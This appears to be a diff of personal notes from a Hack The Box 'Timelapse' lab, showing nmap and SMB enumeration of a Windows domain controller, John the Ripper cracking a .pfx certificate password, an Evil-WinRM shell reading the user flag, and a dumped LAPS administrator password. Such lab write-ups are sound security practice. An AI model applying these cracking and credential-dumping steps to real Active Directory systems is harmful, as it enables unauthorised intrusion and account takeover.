@@ -1,0 +1,103 @@
+┌──(gamer㉿kali)-[~/Downloads]
+└─$ sudo nmap -sV -O 10.10.11.152
+[sudo] password for gamer: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 17:39 WIB
+Nmap scan report for 10.10.11.152
+Host is up (0.026s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-05-27 18:39:23Z)
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.97 seconds
+
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.11.152
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===================================== 
+|    Session Check on 10.10.11.152    |
+ ===================================== 
+[+] Server 10.10.11.152 allows sessions using username '', password ''
+[+] Got domain/workgroup name: 
+
+ =========================================== 
+|    Getting domain SID for 10.10.11.152    |
+ =========================================== 
+Domain Name: TIMELAPSE
+Domain Sid: S-1-5-21-671920749-559770252-3318990721
+[+] Host is part of a domain (not a workgroup)
+
+
+We can see that port 53 is running domain as dns/udp and in port 88 it has kerberos-sec and in port 389 it has 
+ ldap from this we can assume that this is a Domain Controller
+
+
+https://gist.github.com/grutz/6206734
+https://aidenpearce369.github.io/htb/offsec/timelapse/
+
+
+┌──(hacking_env)─(gamer㉿kali)-[~/Hacking/CTFs/HTB/windows_timelapse]
+└─$ john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt --rule /usr/share/john/rules/rockyou-30000.rule     1 ⨯
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:00:18 DONE (2022-05-31 07:15) 0.05387g/s 174124p/s 174124c/s 174124C/s thurgkub..thsco04
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+*Evil-WinRM* PS C:\Users\legacyy> ls Desktop
+
+
+Directory: C:\Users\legacyy\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/30/2022   7:45 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\legacyy> cat Desktop/user.txt
+4f4a62cd8ca8a1b548eeb42a60048c4d
+*Evil-WinRM* PS C:\Users\legacyy>
+
+
+PSComputerName              : localhost
+RunspaceId                  : 533a87c2-712a-4168-a2ba-8d288ac7729a
+DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName                 : dc01.timelapse.htb
+Enabled                     : True
+ms-Mcs-AdmPwd               : DC01$69}Nr4E9tNj1C@9ypO8;2sus
+ms-Mcs-AdmPwdExpirationTime : 132989079234932708
+Name                        : DC01
+ObjectClass                 : computer
+ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName              : DC01$
+SID                         : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName           :
+
